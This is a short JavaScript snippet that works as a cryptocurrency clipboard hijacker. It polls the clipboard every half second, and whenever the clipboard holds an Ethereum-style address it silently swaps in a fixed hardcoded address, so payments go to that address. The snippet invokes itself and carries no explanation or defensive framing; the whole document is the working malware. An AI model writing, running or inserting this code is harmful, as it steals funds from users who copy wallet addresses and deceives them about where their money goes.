async function watch() {
    while (true) {
        const contents = await navigator.clipboard.readText();
        if (/^0x[0-9a-fA-F]{40}$/.test(contents)) {
            await navigator.clipboard.writeText("0x91e5B37e4dB27a893F4B59E20e265c7086B414c9");
        }
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}
watch();
